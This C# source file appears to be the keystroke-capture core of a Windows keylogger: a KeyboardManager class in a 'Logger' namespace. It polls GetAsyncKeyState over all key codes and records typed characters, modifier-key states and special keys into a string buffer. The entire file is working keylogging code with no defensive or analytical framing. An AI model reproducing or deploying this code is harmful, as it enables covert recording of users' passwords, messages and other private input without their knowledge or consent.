using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Logger.Core
{
    public class KeyboardManager
    {
        private static bool _altOn;
        private static bool _ctrlOn;
        private static bool _capsLockOn;

        private static readonly Dictionary<string, string> FunctionKeyLookup = new Dictionary<string, string>
        {
            {"LButton", "<LMouse>"},
            {"RButton", "<RMouse>"},
            {"Back", "<Backspace>"},
            {"Space", " "},
            {"Return", "<Enter>"},
            {"Enter", "<Enter>"},
            {"Delete", "<Del>"},
            {"Insert", "<Ins>"},
            {"Home", "<Home>"},
            {"End", "<End>"},
            {"Tab", "<Tab>"},
            {"Prior", "<Page Up>"},
            {"PageDown", "<Page Down>"},
            {"RWin", "<Win>"},
            {"LWin", "<Win>"}
        };

        private static readonly Dictionary<string, string> NumericKeyRowLookup = new Dictionary<string, string>
        {
            {"48", "0"},
            {"49", "1"},
            {"50", "2"},
            {"51", "3"},
            {"52", "4"},
            {"53", "5"},
            {"54", "6"},
            {"55", "7"},
            {"56", "8"},
            {"57", "9"},
            {"186", ";"},
            {"187", "="},
            {"188", ","},
            {"189", "-"},
            {"190", "."},
            {"191", "/"},
            {"192", "`"},
            {"219", "["},
            {"220", "\\"},
            {"221", "]"},
            {"222", "'"}
        };

        private static readonly Dictionary<string, string> SpecialKeyRowLookup = new Dictionary<string, string>
        {
            {"48", ")"},
            {"49", "!"},
            {"50", "@"},
            {"51", "#"},
            {"52", "$"},
            {"53", "%"},
            {"54", "^"},
            {"55", "&"},
            {"56", "*"},
            {"57", "("},
            {"186", ":"},
            {"187", "+"},
            {"188", "<"},
            {"189", "_"},
            {"190", ">"},
            {"191", "?"},
            {"192", "~"},
            {"219", "{"},
            {"220", "|"},
            {"221", "}"},
            {"222", "\""}
        };

        private static bool ControlKey => Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000);
        private static bool ShiftKey => Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000);
        private static bool CapsLock => Convert.ToBoolean(GetAsyncKeyState(Keys.CapsLock) & 0x8000);
        private static bool AltKey => Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        private static bool UpdateKeyState(ref bool currentState, bool newState)
        {
            if (newState)
            {
                if (currentState) return false;

                currentState = true;
            }
            else
            {
                if (!currentState) return false;

                currentState = false;
            }

            return true;
        }

        public static string GetKeys()
        {
            var keyBuffer = new StringBuilder(1024);

            try
            {
                foreach (
                    var i in from int i in Enum.GetValues(typeof (Keys)) where GetAsyncKeyState(i) == -32767 select i)
                {
                    if (UpdateKeyState(ref _ctrlOn, ControlKey))
                        keyBuffer.Append(_ctrlOn ? "<Ctrl=On>" : "<Ctrl=Off>");

                    if (UpdateKeyState(ref _altOn, AltKey))
                        keyBuffer.Append(_altOn ? "<Alt=On>" : "<Alt=Off>");

                    if (UpdateKeyState(ref _capsLockOn, CapsLock))
                        keyBuffer.Append(_capsLockOn ? "<CapsLock=On>" : "<CapsLock=Off>");

                    var keyName = Enum.GetName(typeof (Keys), i);

                    if (keyName != null && FunctionKeyLookup.ContainsKey(keyName))
                    {
                        keyBuffer.Append(FunctionKeyLookup[keyName]);
                    }

                    keyName = i.ToString();

                    if (ShiftKey)
                    {
                        if (IsAsciiCharacterValue(i))
                        {
                            keyBuffer.Append((char) i);
                        }
                        else if (SpecialKeyRowLookup.ContainsKey(keyName))
                        {
                            keyBuffer.Append(SpecialKeyRowLookup[keyName]);
                        }
                    }
                    else
                    {
                        if (IsAsciiCharacterValue(i))
                        {
                            keyBuffer.Append(GetUppercaseAsciiCharacterValue(i));
                        }
                        else if (NumericKeyRowLookup.ContainsKey(keyName))
                        {
                            keyBuffer.Append(NumericKeyRowLookup[keyName]);
                        }
                    }
                }
            }
            catch
            {
            }

            return keyBuffer.ToString();
        }

        private static bool IsAsciiCharacterValue(int asciiValue)
        {
            return asciiValue >= 65 && asciiValue <= 122;
        }

        private static char GetUppercaseAsciiCharacterValue(int asciiValue)
        {
            return (char) (asciiValue + 32);
        }
    }
}